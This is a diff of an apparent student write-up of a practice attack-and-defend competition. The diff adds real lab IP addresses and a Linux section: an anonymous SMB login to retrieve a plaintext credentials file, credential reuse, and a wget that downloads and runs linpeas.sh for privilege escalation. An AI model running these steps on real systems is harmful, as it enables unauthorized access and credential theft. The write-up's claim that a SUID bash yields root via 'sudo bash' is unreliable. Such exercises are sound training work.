@@ -35,7 +35,7 @@ There was also trivia questions what would give us points if we answered them co
 To start off with windows i did an nmap scan to see what ports were open. 
 
    
-    nmap -sC -sV -T5 [Ip Address]
+    nmap -sC -sV -T5 10.109.124.214
 
 <img width="1227" height="938" alt="Screenshot 2025-12-01 000733" src="https://github.com/user-attachments/assets/f31fec3b-c64e-416d-8f33-67847c29d8ed" />
 
@@ -50,13 +50,13 @@ This question allowed me to finally start chipping away at windows.
 
 First, I did this command to find all smb shares on the machine.
 
-    smbclient -L [Ip Address]
+    smbclient -L 10.109.124.232
 
 <img width="637" height="239" alt="image" src="https://github.com/user-attachments/assets/bc822165-d897-4bc2-8d6a-25da91c2514e" />
 
 After getting a look at the shares i instantly suspected that data was the share with plain text credentials so i used this command to log in. When I logged in, i found the file and sent it to my home directory with these two commands
 
-    smbclient //[Ip Address]/Data -N
+    smbclient //10.109.124.232/Data -N
     ------------------------------------
     ls
     get creds.txt
@@ -159,14 +159,30 @@ After that, i changed the passwords of the domain admin accounts that i used to 
 
 <img width="714" height="236" alt="image" src="https://github.com/user-attachments/assets/3da1b254-e231-43f6-99c9-59c994d49f30" />
 
-Finally, when that was over, I went ahead and planted my flag in remaining Windows machines.
+Finally, when that was over, I went ahead and did the same in the remaining Windows machines.
 
 <img width="358" height="18" alt="image" src="https://github.com/user-attachments/assets/2b5f2520-f3ff-4c1b-aaee-a602416aa17b" />
 
 ---
 ## Attacking Linux
 
-After i got claimed all of the windows boxes, i thought about using some of the credentials that i gained from the Windows machines
+After i got claimed all of the windows boxes, i thought about using some of the credentials that i gained from the Windows machines and luckily, i got a hit! But soon after i logged in, i got kicked off by the person defending the machine.
+
+<img width="1076" height="457" alt="image" src="https://github.com/user-attachments/assets/6d677a74-ad4e-4287-92e0-a983072058ab" />
+
+<img width="637" height="38" alt="image" src="https://github.com/user-attachments/assets/b319378f-f6c2-49cf-be80-8fdf72a32841" />
+
+At that point, I decided to log back in and try to get linpeas (A Linux privledge escalation tool) running.
+
+
+    wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
+    ------------------------------------
+     chmod +x linpeas.sh
+     ./linpeas.sh
+     
+While it was running, I found a suid binary on bash means all i had to do was type in "sudo bash" to get root.
+
+<img width="1374" height="511" alt="image" src="https://github.com/user-attachments/assets/7d633ab4-4022-41e8-8ff5-1fc645f76dbc" />
 
 
 
